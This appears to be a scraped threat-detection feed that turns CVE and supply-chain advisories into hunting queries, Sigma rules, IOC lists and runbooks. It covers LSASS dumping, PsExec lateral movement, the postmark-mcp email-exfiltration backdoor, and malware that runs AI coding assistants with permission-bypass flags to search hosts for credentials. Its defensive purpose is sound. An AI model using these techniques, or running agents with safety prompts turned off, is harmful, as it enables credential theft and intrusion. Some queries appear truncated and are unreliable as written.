CISA KEV: CVE-2025-59689 — Libraesva Email Security Gateway Command Injection Vulnerability

CISA KEV
2025-09-29 1 use case 0 techniques 3 kill-chain phases detected

Libraesva Email Security Gateway (ESG) contains a command injection vulnerability which allows command injection via a compressed e-mail attachment. Vendor: Libraesva, Product: Email Security Gateway. Federal patch due: 2025-10-20.

Actions on Objectives
—
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2025-59689")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2025-59689")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

Critical

CISA KEV: CVE-2025-10035 — Fortra GoAnywhere MFT Deserialization of Untrusted Data Vulnerability

CISA KEV
2025-09-29 6 use cases 1 technique 5 kill-chain phases detected

Fortra GoAnywhere MFT contains a deserialization of untrusted data vulnerability allows an actor with a validly forged license response signature to deserialize an arbitrary actor-controlled object, possibly leading to command injection. Vendor: Fortra, Product: GoAnywhere MFT. Known ransomware use: Known. Federal patch due: 2025-10-20.

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: LSASS Process Access Outside Microsoft-Signed Tooling
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d04
status: experimental
description: |
    Anything opening lsass.exe with read-memory access that isn't a
    Microsoft signed component (Defender, csrss, etc.) is suspect.
    Mimikatz / Pypykatz / nanodump signature.
references:
    - https://attack.mitre.org/techniques/T1003/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1003.001
    - attack.credential-access
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
    filter_known_good:
        SourceImage|endswith:
            - '\MsSense.exe'
            - '\MsMpEng.exe'
            - '\csrss.exe'
            - '\svchost.exe'
            - '\wininit.exe'
            - '\services.exe'
            - '\lsm.exe'
            - '\SearchProtocolHost.exe'
    condition: selection and not filter_known_good
falsepositives:
    - Third-party EDR / forensic tools — extend the filter list
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688            // process-create (audit-policy required)
| where Account !endswith "$"
| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: PsExec / SMB Lateral Movement Tooling Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |
    PsExec, paexec, smbexec, csexec, remcom — admin-grade tooling that
    pivots over SMB. Pair with `wmic /node:` for the full cluster.
references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://attack.mitre.org/techniques/T1569/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1021.002
    - attack.t1569.002
    - attack.lateral-movement
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_psexec:
        Image|endswith:
            - '\psexec.exe'
            - '\psexec64.exe'
            - '\psexesvc.exe'
            - '\paexec.exe'
            - '\csexec.exe'
            - '\remcom.exe'
            - '\smbexec.py'
    selection_wmic_remote:
        Image|endswith:
            - '\wmic.exe'
        CommandLine|contains:
            - '/node:'
    condition: selection_psexec or selection_wmic_remote
falsepositives:
    - Sysadmins running approved remote-management tooling — wrap with
      a known-admin-host watchlist
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
       OR (Processes.process_name="wmic.exe" AND Processes.process="*/node:*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("31.220.45.120", "45.11.183.123", "213.183.63.41") or RemoteUrl has_any ("")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic(["31.220.45.120", "45.11.183.123", "213.183.63.41"]);
let BadDomains = dynamic([""]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)
| project TimeGenerated, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkProtocol
| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("4106c35ff46bb6f2f4a42d63a2b8a619f1e1df72414122ddf6fd1b1a644b3220", "c7e2632702d0e22598b90ea226d3cde4830455d9232bd8b33ebcb13827e99bc3", "cd5aa589873d777c6e919c4438afe8bceccad6bbe57739e2ccb70b39aee1e8b3", "5ba7de7d5115789b952d9b1c6cff440c9128f438de933ff9044a68fff8496d19") or SHA1 in~ ("4106c35ff46bb6f2f4a42d63a2b8a619f1e1df72414122ddf6fd1b1a644b3220", "c7e2632702d0e22598b90ea226d3cde4830455d9232bd8b33ebcb13827e99bc3", "cd5aa589873d777c6e919c4438afe8bceccad6bbe57739e2ccb70b39aee1e8b3", "5ba7de7d5115789b952d9b1c6cff440c9128f438de933ff9044a68fff8496d19") or MD5 in~ ("4106c35ff46bb6f2f4a42d63a2b8a619f1e1df72414122ddf6fd1b1a644b3220", "c7e2632702d0e22598b90ea226d3cde4830455d9232bd8b33ebcb13827e99bc3", "cd5aa589873d777c6e919c4438afe8bceccad6bbe57739e2ccb70b39aee1e8b3", "5ba7de7d5115789b952d9b1c6cff440c9128f438de933ff9044a68fff8496d19")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("4106c35ff46bb6f2f4a42d63a2b8a619f1e1df72414122ddf6fd1b1a644b3220", "c7e2632702d0e22598b90ea226d3cde4830455d9232bd8b33ebcb13827e99bc3", "cd5aa589873d777c6e919c4438afe8bceccad6bbe57739e2ccb70b39aee1e8b3", "5ba7de7d5115789b952d9b1c6cff440c9128f438de933ff9044a68fff8496d19") or SHA1 in~ ("4106c35ff46bb6f2f4a42d63a2b8a619f1e1df72414122ddf6fd1b1a644b3220", "c7e2632702d0e22598b90ea226d3cde4830455d9232bd8b33ebcb13827e99bc3", "cd5aa589873d777c6e919c4438afe8bceccad6bbe57739e2ccb70b39aee1e8b3", "5ba7de7d5115789b952d9b1c6cff440c9128f438de933ff9044a68fff8496d19") or MD5 in~ ("4106c35ff46bb6f2f4a42d63a2b8a619f1e1df72414122ddf6fd1b1a644b3220", "c7e2632702d0e22598b90ea226d3cde4830455d9232bd8b33ebcb13827e99bc3", "cd5aa589873d777c6e919c4438afe8bceccad6bbe57739e2ccb70b39aee1e8b3", "5ba7de7d5115789b952d9b1c6cff440c9128f438de933ff9044a68fff8496d19")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["4106c35ff46bb6f2f4a42d63a2b8a619f1e1df72414122ddf6fd1b1a644b3220", "c7e2632702d0e22598b90ea226d3cde4830455d9232bd8b33ebcb13827e99bc3", "cd5aa589873d777c6e919c4438afe8bceccad6bbe57739e2ccb70b39aee1e8b3", "5ba7de7d5115789b952d9b1c6cff440c9128f438de933ff9044a68fff8496d19"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

title: File or Process Matching Article Hash IOCs
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0b
status: experimental
description: |
    Replace `__HASH_LIST__` placeholder with article-specific SHA256
    values. Use a watchlist or external indicator file for management
    at scale.
references:
    - https://attack.mitre.org/techniques/T1027/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1027
    - attack.defense-evasion
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Hashes|contains:
            - 'SHA256=__HASH_PLACEHOLDER_REPLACE_ME__'

CISA KEV: CVE-2025-20352 — Cisco IOS and IOS XE Software SNMP Denial of Service and Remote Code Execution Vulnerability

CISA KEV
2025-09-29 2 use cases 1 technique 3 kill-chain phases detected

Cisco IOS and IOS XE contains a stack-based buffer overflow vulnerability in the Simple Network Management Protocol (SNMP) subsystem that could allow for denial of service or remote code execution. A successful exploit could allow a low-privileged attacker to cause the affected system to reload, resulting in a DoS condition, or allow a high-privileged attacker to execute arbitrary code as the root user and obtain full control of the affected system. Vendor: Cisco, Product: IOS and IOS XE. Federal patch due: 2025-10-20.

// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2025-20352", "CVE-2017-3881")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2025-20352", "CVE-2017-3881")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,

| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Pre-filter both ASIM tables before the union — same pattern as the

let BadHashes = dynamic(["2abc874435c16aa5cfd431b0d9c26095ef4b9429bd82306f054c367e96df49b2", "69d761bdde73ea8e33384cf986d7e9c2d9011f7aad8933e8af64e60a77091e11", "b08877f6f1c6c097240a6a8aa4a23243e3b14a1432170bc3fa5fa9886a2b19b4", "9b8a896aa2057f46e17b18bbe091d85fb816b1d3232a3178d6aba94df3a92f6a", "81b35152768f28a479ba9f7e27d66042b0d7edcd79355481aa401f3f47a7733b", "3a524bc40ca7c11b68283504f0119caeefd7589edea621d43d5d0cd973354675", "e303d0c6c59b4dc55edc0212a9319702e9db7fa03185ae9177777b874c02d4c1", "7cc7aed51adb426e55d82fd74c55b78f6ecbb895a315be721ef149a17f4b3a9b", "235dc2d8c92661e5e2797a03bccd2653272ca1ac93401d194d7784930ca17a5a"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

| where CveId in~ ("CVE-2021-21311")

| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

High

Malicious MCP Server on npm postmark-mcp Harvests Emails

Snyk
2025-09-25 6 use cases 2 techniques 6 kill-chain phases detected

Urgent security alert: On September 25, 2025, the npm package 'postmark-mcp' was compromised, secretly exfiltrating email contents. Learn about the incident timeline, impact, and immediate mitigation steps, including uninstalling, rotating credentials, and scanning with Snyk's MCP-Scan.

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Malicious MCP Server on npm postmark-mcp Harvests Emails
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Installation or presence of malicious postmark-mcp npm package (v1.0.16+)
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] DNS or HTTP egress to giftshop.club exfil domain · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Outbound email BCC'd to giftshop.club exfil domain (postmark-mcp backdoor)
Outbound email BCC'd to giftshop.club exfil domain (postmark-mcp backdoor) AIActions on Objectives High
Detects any outbound message that contains a BCC, CC, or recipient at giftshop.club — the hard-coded exfil sink injected into postmark-mcp v1.0.16-1.0.18. Every email sent through the compromised MCP server silently appends phan@giftshop.club as BCC. Rationale: BCC to phan@giftshop.club is the literal exfil mechanism named in the Snyk advisory and the only code diff between v1.0.15 (benign) and v1.0.18 (malicious). Any tenant email landing at this domain is the exfil event itself, not a precursor — extremely high fidelity. Cross-checked: Snyk advisory, npm registry removal of postmark-mcp, ActiveCampaign/postmark-mcp upstream repo. Cross-checked against: • https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/ • https://github.com/ActiveCampaign/postmark-mcp • https://www.npmjs.com/~phanpak
ATT&CKT1567 T1114.003
Data sourcesEmail.All_Email
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate business correspondence to a real recipient whose mail server happens to be hosted under giftshop.club (none known at time of writing — domain is currently associated only with the exfil sink)
  • Phishing-simulation tooling pre-seeded with the IOC domain for training
  • Threat-intel platforms that auto-deliver IOC reports to abuse@giftshop.club
  • Security researcher mailbox correspondence about the incident itself
  • Sandbox / EDR detonation of the malicious package within the corp environment
Response runbook
Step 1 — Triage: Pull all matching messages, identify sending mailbox(es), confirm whether the agent/automation tied to that mailbox has postmark-mcp installed (`npm ls postmark-mcp` on each host, search package-lock.json across repos). Inspect Subject + InternetMessageId to scope which downstream recipients also received the legitimate copy. Step 2 — Contain: Block giftshop.club at the mail gateway and egress proxy, revoke the Postmark API token used by the affected agent, uninstall postmark-mcp on every host (`npm uninstall -g postmark-mcp` and remove from project deps). Step 3 — Hunt: Pull 30-day message-trace for any giftshop.club recipient, identify all credentials/links/PII in the exfiltrated body content (password resets, API tokens, invoices), rotate every credential that appeared in those messages, and check npm audit for other phanpak-authored packages in the environment.

   or AdditionalFields has "giftshop.club"
| project Timestamp, NetworkMessageId, InternetMessageId, SenderFromAddress, SenderMailFromAddress, RecipientEmailAddress, Subject, EmailDirection, DeliveryAction, DeliveryLocation, SenderIPv4
| order by Timestamp desc

| where OfficeWorkload =~ "Exchange"
| where Recipients has "giftshop.club" or P2RecipientList has "giftshop.club" or Sender has "giftshop.club"
| project TimeGenerated, Operation, UserId, ClientIP, Sender, P2Sender, Recipients, P2RecipientList, Subject, MessageId, InternetMessageId
| order by TimeGenerated desc

DNS or HTTP egress to giftshop.club exfil domain AICommand & Control High
Network-layer detection for any host reaching giftshop.club — covers the Postmark API call path that secretly attaches the BCC. Catches hosts where postmark-mcp is installed but no email has actually shipped yet, or where mail telemetry isn't centralised. Rationale: giftshop.club is the only network IOC named in the Snyk advisory and is the C2/exfil endpoint receiving the BCC mail. Per-table column corrections: DnsEvents uses Name+Computer+ClientIP, ImDnsActivity uses DnsQuery+DvcHostname+SrcIpAddr, CommonSecurityLog uses DestinationHostName+SourceHostName+RequestURL — none of these tables expose IPAddresses or DeviceName. Cross-checked: Snyk advisory and npm registry takedown. Cross-checked against: • https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/ • https://www.npmjs.com/~phanpak
ATT&CKT1071.001 T1567
Data sourcesNetwork_Resolution.DNS Web.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel feed retrieval that includes giftshop.club as a sample IOC and the test scanner resolves it
  • Security researcher hosts deliberately resolving the domain to study sinkhole state
  • Sandbox detonation lab traffic
  • Endpoint browsing of the Snyk advisory page that embeds the bracketed defanged domain (most browsers won't resolve giftshop[.]club, but some link-preview agents do)
  • DNS resolver cache-warming behaviour on shared infra
Suppression filter
| where InitiatingProcessFileName !in~ ("snyk.exe","mcp-scan.exe") and InitiatingProcessCommandLine !has "sandbox"
Response runbook
Step 1 — Triage: Identify the initiating process on the resolving host (Defender InitiatingProcessFileName / Falcon ContextImageFileName); if it's node.exe or an MCP runtime, confirm postmark-mcp is in that process's working directory. Step 2 — Contain: Sinkhole giftshop.club at the resolver and block at egress, isolate the offending host if EDR confirms postmark-mcp is loaded, and revoke any Postmark API tokens scoped to that host. Step 3 — Hunt: Pivot on the parent process tree to find which agentic workflow invoked the MCP server, enumerate every node_modules folder org-wide for postmark-mcp@>=1.0.16, and review 30-day mail logs for outbound BCCs to giftshop.club to scope exfiltration.

Installation or presence of malicious postmark-mcp npm package (v1.0.16+) AIInstallation High
File-system detection for postmark-mcp arriving on disk via npm install, yarn add, or repo clone — catches the package before its first email exfil. Targets the package's index.js / package.json under any node_modules path. Rationale: postmark-mcp is the literal compromised npm package name from the Snyk advisory; v1.0.16+ are the malicious releases. Any install/exec is a high-confidence indicator that the host is shipping email-harvesting code, even before the first BCC fires. Cross-checked against the npm registry takedown and the Snyk advisory. Cross-checked against: • https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/ • https://www.npmjs.com/~phanpak • https://github.com/invariantlabs-ai/mcp-scan
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Filesystem Endpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher / blue-team host deliberately installing postmark-mcp to study the backdoor
  • Snyk MCP-Scan or similar tooling string-matching the package name in scan output
  • Air-gapped CI test environments validating supply-chain detections
  • Forensic triage workstation cloning the upstream ActiveCampaign/postmark-mcp repo (note: upstream is unrelated to the malicious npm package — same name, different supply chain)
  • Developer running `npm view postmark-mcp` for incident-response triage
Suppression filter
| where ProcessCommandLine !has_any ("snyk test","mcp-scan","npm audit","npm view","npm info")
Response runbook
Step 1 — Triage: Inspect the package version actually installed (`npm ls postmark-mcp --all` on host, or check package-lock.json) — confirm it's >=1.0.16 (1.0.16-1.0.18 are the known-malicious range). If <1.0.16 or absent from npm, downgrade priority. Step 2 — Contain: Uninstall the package from every host and CI runner, purge node_modules and the npm cache (`npm cache clean --force`), rotate the Postmark server token and any SMTP credentials the agent used, and block the package name in the internal npm registry / repo policy. Step 3 — Hunt: Inventory other npm packages published by user phanpak across the org and treat them as untrusted until reviewed; check 30-day mail logs for BCC to giftshop.club; pivot to the UC #2 network detection to confirm whether exfil has actually occurred.

  | project Timestamp, DeviceName, DeviceId, ActionType, FolderPath, FileName, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
),

  | where Timestamp > ago(30d)

     or FileName in~ ("npm.exe","npm.cmd","yarn.cmd","pnpm.exe","npx.cmd","npx.exe")

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access

    category: process_creation
    product: windows

    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium

// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2025-20333", "CVE-2025-20362", "CVE-2025-20363")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2025-20333", "CVE-2025-20362", "CVE-2025-20363")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

s1ngularity nx: AI CLI assistant invoked with permission-bypass flags (Claude/Gemini/Q) AIActions on Objectives High
Detects the novel TTP from the s1ngularity nx supply-chain attack: the malware spawns developer-AI CLIs (claude, gemini, amazon q) with reconnaissance-enabling flags (--dangerously-skip-permissions, --yolo, --trust-all-tools) so the LLM agents perform credential/wallet discovery on the host. These flags exist solely to disable the assistants' interactive safety prompts and have no legitimate developer use in non-interactive contexts. Rationale: Article literally enumerates the cliChecks object — `claude --dangerously-skip-permissions -p PROMPT`, `gemini --yolo -p PROMPT`, `q chat --trust-all-tools --no-interactive PROMPT`. These exact flag strings are the most article-specific behavioural signal of the attack and have no benign business case. Corroborated by Socket, Snyk, and the official GHSA-cxm3-wv7p-598c advisory. Cross-checked against: • https://github.com/nrwl/nx/security/advisories/GHSA-cxm3-wv7p-598c • https://socket.dev/blog/nx-packages-compromised • https://semgrep.dev/blog/2025/security-alert-nx-compromised-to-steal-wallets-and-credentials/ • 